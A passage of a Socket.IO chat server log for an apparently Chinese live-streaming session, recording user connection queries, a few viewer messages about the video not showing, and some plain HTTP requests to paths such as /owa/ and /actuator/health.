  uid: '9d17822918454456920a04d9da67548b',
  username: '亚芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nHAf' }
[2021-04-25 14:43:45.891] [INFO] - [ 'C5WS4Vj4mdn3aJh1ADHo', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:43:51.634] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd3895ef97d954417b5c32f00fe30a7f0',
  username: '戚年凤',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nHw8' }
[2021-04-25 14:43:51.634] [INFO] - [ 'mP8v83aulqQWogImADHp', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:43:55.426] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '3d3cb05d901b409191f2f76a7042cc19',
  username: '龙 龙',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nJHn' }
[2021-04-25 14:43:55.427] [INFO] - [ 'TGlLUJXmJCz8mNIOADHq', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:43:59.608] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'e2ada79e16ac43579eda96a45867274d',
  username: '水晶',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nKAn' }
[2021-04-25 14:43:59.608] [INFO] - [ 'BXFde1Hyta1DtskCADHr', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:43:59.946] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '802f7070d322497285b0217a293c573b',
  username: '笑笑',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nKJ0' }
[2021-04-25 14:43:59.947] [INFO] - [ '3vcjdKqZnu2Qu0fqADHs', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:44:10.313] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '92c5691b971747cdb57a70bbb956c9ac',
  username: '小德兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nMc9' }
[2021-04-25 14:44:10.313] [INFO] - [ 'TK6rKEyjEhEfZ_GiADHt', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:44:48.774] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '04a57ba3c32e45499b70860b39c98a6a',
  username: '许静芬',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nWb_' }
[2021-04-25 14:44:48.774] [INFO] - [ '3joR-5-DvxlbsG5ZADHu', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:44:54.064] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '92c5691b971747cdb57a70bbb956c9ac',
  username: '小德兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nXHt' }
[2021-04-25 14:44:54.064] [INFO] - [ 'z4gQsDvdjZoxRH5sADHv', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:45:08.341] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '97f07c37f3194a94b9894a4562db50f1',
  username: '佳音',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7navy' }
[2021-04-25 14:45:08.342] [INFO] - [ '6L8pfu91b4cGrKmFADHw', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:45:11.186] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '9d17822918454456920a04d9da67548b',
  username: '亚芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nb_R' }
[2021-04-25 14:45:11.187] [INFO] - [ 'qFvJglgmEAM-OFatADHx', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:45:16.280] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a80e7770892c4dff98b30560c7ac7cae',
  username: '小云',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nd7U' }
[2021-04-25 14:45:16.281] [INFO] - [ 'Jmm7VUw9lBh-Oq8OADHy', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:45:20.798] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '92c5691b971747cdb57a70bbb956c9ac',
  username: '小德兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ndpX' }
[2021-04-25 14:45:20.799] [INFO] - [ 'jRxNxQiU2taxaJ5aADHz', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:45:25.852] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '92c5691b971747cdb57a70bbb956c9ac',
  username: '小德兰',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nf2I' }
[2021-04-25 14:45:25.852] [INFO] - [ 'l86MpqkaASSD98uZADH0', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:45:51.066] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'af0e160739be4baf824fa6ee42c3e750',
  username: '茅红',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7nlvP' }
[2021-04-25 14:45:51.066] [INFO] - [ 'sKwHqis3m2AenxJ6ADH1', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:46:08.638] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '65d257278eea4a34b574fc43ad666e5f',
  username: '淡泊',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7npnO' }
[2021-04-25 14:46:08.638] [INFO] - [ 'eBtvISoGmHQ4hwYCADH2', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:46:34.996] [INFO] - msg { role: 0,
  username: '亚芳',
  _id: 'qFvJglgmEAM-OFatADHx',
  msg: '没有视频' }
[2021-04-25 14:47:18.994] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'af0e160739be4baf824fa6ee42c3e750',
  username: '茅红',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7o5NO' }
[2021-04-25 14:47:18.994] [INFO] - [ '9wFoj7mapVhttzDmADH3', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:47:36.035] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '97f07c37f3194a94b9894a4562db50f1',
  username: '佳音',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7o8zc' }
[2021-04-25 14:47:36.035] [INFO] - [ 'qhNsNTWrA3nt2QWPADH4', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:47:37.794] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'af0e160739be4baf824fa6ee42c3e750',
  username: '茅红',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7o9z2' }
[2021-04-25 14:47:37.794] [INFO] - [ 'Z6LPcTfXv9WXXurhADH5', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:47:45.302] [INFO] - msg { role: 0,
  username: '亚芳',
  _id: 'qFvJglgmEAM-OFatADHx',
  msg: '是网络问题吗？' }
[2021-04-25 14:47:46.412] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '3ba1f29bd2e54907b9ca3bea2d89511c',
  username: 'QiQi',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7oBlS' }
[2021-04-25 14:47:46.412] [INFO] - [ 'DiWhyUvVTynCP9NmADH6', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:47:59.037] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd3895ef97d954417b5c32f00fe30a7f0',
  username: '戚年凤',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7oEJk' }
[2021-04-25 14:47:59.037] [INFO] - [ 'H1RbaYNyNp2o5FOtADH7', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:48:04.340] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '97f07c37f3194a94b9894a4562db50f1',
  username: '佳音',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7oFtz' }
[2021-04-25 14:48:04.340] [INFO] - [ 'bgWJav9IJLorBVvdADH8', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:48:08.969] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '9d17822918454456920a04d9da67548b',
  username: '亚芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7oHPF' }
[2021-04-25 14:48:08.969] [INFO] - [ 'SnUCtdluWaSYKiNVADH9', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:49:16.258] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '6aa9186bba864313985c85cfae757997',
  username: '翁幼奇',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7oXWY' }
[2021-04-25 14:49:16.258] [INFO] - [ '94JEFZuZp6QiVCxhADH-', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:49:20.492] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '49951db9b51240e7a8463407a35a68f3',
  username: '奇奇',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7oYvt' }
[2021-04-25 14:49:20.492] [INFO] - [ 'iqhIlD0Eh68iLnlRADH_', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:49:26.166] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '802f7070d322497285b0217a293c573b',
  username: '笑笑',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7oZym' }
[2021-04-25 14:49:26.167] [INFO] - [ 'T44TCHT8VujvyD1MADIA', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:49:47.712] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a8b239cf558348819f34794ee4db88b4',
  username: '西湖客',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7oflH' }
[2021-04-25 14:49:47.712] [INFO] - [ 'TzTg9eDrOmdEpgWfADIB', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:49:53.146] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '3ba1f29bd2e54907b9ca3bea2d89511c',
  username: 'QiQi',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7oghd' }
[2021-04-25 14:49:53.147] [INFO] - [ 'C3hmwdLIUOgXg_kCADIC', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:50:08.161] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '97f07c37f3194a94b9894a4562db50f1',
  username: '佳音',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ok6i' }
[2021-04-25 14:50:08.161] [INFO] - [ 'JSkfc_BgRYxDNdTBADID', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:50:22.203] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '5ba348b96e7e435ebfbac6cc3fbcb93e',
  username: 'W.S.Q',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7onnG' }
[2021-04-25 14:50:22.204] [INFO] - [ 'mb7m8oodxCNddnaYADIE', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:50:31.716] [INFO] - [47.101.190.59] GET http://47.100.89.2:8250/ 200 0ms
[2021-04-25 14:50:49.518] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '26c4c2e236d24f238c2a9cf900fe49c9',
  username: '陈建达',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ouYd' }
[2021-04-25 14:50:49.519] [INFO] - [ '00HsQMSbdAai4SRSADIF', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:50:54.071] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a8b239cf558348819f34794ee4db88b4',
  username: '西湖客',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7ovyS' }
[2021-04-25 14:50:54.071] [INFO] - [ 'CmtdpScDHULTjCo4ADIG', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:50:57.114] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '5ba348b96e7e435ebfbac6cc3fbcb93e',
  username: 'W.S.Q',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7owIB' }
[2021-04-25 14:50:57.115] [INFO] - [ '6YrJ1nML_Ut9WHx3ADIH', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:51:20.043] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '5ba348b96e7e435ebfbac6cc3fbcb93e',
  username: 'W.S.Q',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7o_uf' }
[2021-04-25 14:51:20.044] [INFO] - [ '6Xk28ijr4XPbVlNDADII', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:51:26.079] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'd0a0829582ed473dbc67c1330451ff69',
  username: 'why3a3c449873',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7p13T' }
[2021-04-25 14:51:26.079] [INFO] - [ 'lT5_tEWLZMlM3L9pADIJ', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:51:36.196] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '26c4c2e236d24f238c2a9cf900fe49c9',
  username: '陈建达',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7p3xu' }
[2021-04-25 14:51:36.196] [INFO] - [ 'zYWjvTT-dC0Ccy3EADIK', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:51:42.588] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '3d3cb05d901b409191f2f76a7042cc19',
  username: '龙 龙',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7p5LL' }
[2021-04-25 14:51:42.589] [INFO] - [ 'a2TVv4fyJYSaMpgxADIL', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:52:36.450] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '15386701fc604a8aa34c4c7d08852ba7',
  username: '萍',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7pIT3' }
[2021-04-25 14:52:36.450] [INFO] - [ 'axaSbWt6-kuSnYHAADIM', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:52:56.640] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'af0e160739be4baf824fa6ee42c3e750',
  username: '茅红',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7pNkm' }
[2021-04-25 14:52:56.640] [INFO] - [ 'LWqjk3sjLLUzxykcADIN', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:54:54.007] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '54df0ace363e43938e5b8e5c83c91736',
  username: '四方楠',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7pqH-' }
[2021-04-25 14:54:54.007] [INFO] - [ '_HZRlsgTPZUAIsaGADIO', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:56:06.641] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '6a6c0cc94224478e8eec8757e42c51a3',
  username: '梁军',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7q5nM' }
[2021-04-25 14:56:06.642] [INFO] - [ 'UsQeM0_RHxFpDw84ADIP', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:56:22.464] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '0d83c51fd76642b69a26740617532a04',
  username: 'Cute.  莎莎',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7q9c6' }
[2021-04-25 14:56:22.464] [INFO] - [ '_vdhOdfhNcuyhFAAADIQ', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:56:23.237] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'b3847357deae4ade9be06e0a201c0543',
  username: '大小石头的妈',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qA2U' }
[2021-04-25 14:56:23.237] [INFO] - [ 'GGKLAOZlMnvBuDiiADIR', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:56:55.727] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '0d83c51fd76642b69a26740617532a04',
  username: 'Cute.  莎莎',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qHjs' }
[2021-04-25 14:56:55.727] [INFO] - [ 'WCV_-hdvOArzXSPdADIS', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:57:08.023] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '08c5eaec6ef34360bc63d513b5ce55c0',
  username: '天甜',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qL7Q' }
[2021-04-25 14:57:08.023] [INFO] - [ 'uO0Sl8h0J5_Hie3xADIT', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:57:39.914] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '08c5eaec6ef34360bc63d513b5ce55c0',
  username: '天甜',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qSw8' }
[2021-04-25 14:57:39.914] [INFO] - [ 'BCcRJYID460TTIp1ADIU', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:57:43.123] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '60bcbfb463c941af8c186cfd0878654a',
  username: 'xiaoying',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qTYb' }
[2021-04-25 14:57:43.123] [INFO] - [ 'UI7Al8yByStOlRWTADIV', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:57:50.704] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '08c5eaec6ef34360bc63d513b5ce55c0',
  username: '天甜',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qVYi' }
[2021-04-25 14:57:50.704] [INFO] - [ 'T5A-5lfHxnDe99hEADIW', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:57:51.134] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '1e5a94c529784b778f68a9f3e9f2950d',
  username: '张永淸',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qVGD' }
[2021-04-25 14:57:51.134] [INFO] - [ 'xDrZcvWsd9BQfWVLADIX', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:57:51.644] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '9d17822918454456920a04d9da67548b',
  username: '亚芳',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qVfM' }
[2021-04-25 14:57:51.644] [INFO] - [ 'zh2OIA4Vx4oMV_dRADIY', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:58:15.327] [INFO] - msg { role: 0,
  username: 'Cute.  莎莎',
  _id: 'WCV_-hdvOArzXSPdADIS',
  msg: '是结束了吗？？？' }
[2021-04-25 14:58:18.061] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '5c498f266beb48d7ab604bcef5fa14d2',
  username: '大海',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qc13' }
[2021-04-25 14:58:18.062] [INFO] - [ 'Zo746lv3iBLuIKbYADIZ', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:58:19.334] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '5c498f266beb48d7ab604bcef5fa14d2',
  username: '大海',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qcL3' }
[2021-04-25 14:58:19.334] [INFO] - [ '6JNOasAPddjixeWdADIa', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 14:58:54.950] [INFO] - msg { role: 0,
  username: 'Cute.  莎莎',
  _id: 'WCV_-hdvOArzXSPdADIS',
  msg: '看不到' }
[2021-04-25 14:59:15.961] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '1e5a94c529784b778f68a9f3e9f2950d',
  username: '张永淸',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7qpzX' }
[2021-04-25 14:59:15.962] [INFO] - [ 'y1KYSmUnhjyLvk7QADIb', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 15:04:24.282] [INFO] - query { rid: '75fc890996684f49abf8393f085d21b8',
  uid: '1bfaaf5e3fa948b2858082d33e974b62',
  username: '煊彬',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7r_Lh' }
[2021-04-25 15:04:24.283] [INFO] - [ 'CBRpR_HYiAYq18BFADIc', '75fc890996684f49abf8393f085d21b8' ]
[2021-04-25 15:04:35.441] [INFO] - query { rid: '75fc890996684f49abf8393f085d21b8',
  uid: '1bfaaf5e3fa948b2858082d33e974b62',
  username: '煊彬',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7s242' }
[2021-04-25 15:04:35.442] [INFO] - [ 'ejhvXN_Di-7j43TwADId', '75fc890996684f49abf8393f085d21b8' ]
[2021-04-25 15:06:56.878] [INFO] - query { rid: '75fc890996684f49abf8393f085d21b8',
  uid: '1bfaaf5e3fa948b2858082d33e974b62',
  username: '煊彬',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7sabw' }
[2021-04-25 15:06:56.878] [INFO] - [ '7nNfOZ-9UvKB7ogdADIe', '75fc890996684f49abf8393f085d21b8' ]
[2021-04-25 15:07:40.105] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'aaef6c66eec8406cb35cf0e9ca61d51d',
  username: 'mgy',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7slHO' }
[2021-04-25 15:07:40.106] [INFO] - [ '7V9hGw96osq0I0OSADIf', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 15:08:15.459] [INFO] - query { rid: '75fc890996684f49abf8393f085d21b8',
  uid: '1bfaaf5e3fa948b2858082d33e974b62',
  username: '煊彬',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7stlh' }
[2021-04-25 15:08:15.459] [INFO] - [ 'jCxDd_-9qvYNJPCVADIg', '75fc890996684f49abf8393f085d21b8' ]
[2021-04-25 15:15:53.938] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: 'a80e7770892c4dff98b30560c7ac7cae',
  username: '小云',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7udrZ' }
[2021-04-25 15:15:53.939] [INFO] - [ 'LOPpYwnY2RC7Kvr-ADIh', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 15:25:01.925] [INFO] - query { rid: '75fc890996684f49abf8393f085d21b8',
  uid: 'b1e963b4fa7049458b11fc9691d81940',
  username: '碎碎心塞塞',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7wjoF' }
[2021-04-25 15:25:01.925] [INFO] - [ 'fJLMj-LU5eXNdYZYADIi', '75fc890996684f49abf8393f085d21b8' ]
[2021-04-25 15:25:36.095] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '26c4c2e236d24f238c2a9cf900fe49c9',
  username: '陈建达',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na7wrzL' }
[2021-04-25 15:25:36.095] [INFO] - [ 'ldTQFRyTf28ESH5cADIj', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 15:38:36.560] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 15:38:37.591] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/HNAP1/ 200 0ms
[2021-04-25 16:47:30.193] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-25 16:47:30.959] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 16:54:01.329] [INFO] - query { rid: 'e76404b3e11545d8ae88fef2166429c7',
  uid: '1c7371b7694c49758548814699a5ba62',
  username: '海洋',
  role: '0',
  EIO: '3',
  transport: 'polling',
  t: 'Na8F525' }
[2021-04-25 16:54:01.329] [INFO] - [ 'LzgEphmobwqWUusaADIk', 'e76404b3e11545d8ae88fef2166429c7' ]
[2021-04-25 18:03:12.443] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
[2021-04-25 18:13:40.105] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 19:14:22.305] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/ 200 1ms
[2021-04-25 19:38:17.671] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/actuator/health 200 0ms
[2021-04-25 19:53:50.379] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/actuator/health 200 0ms
[2021-04-25 20:25:40.393] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 0ms
[2021-04-25 20:37:17.592] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/owa/ 200 0ms
[2021-04-25 20:46:18.486] [INFO] - [127.0.0.1] GET http://127.0.0.1:8250/ 200 1ms
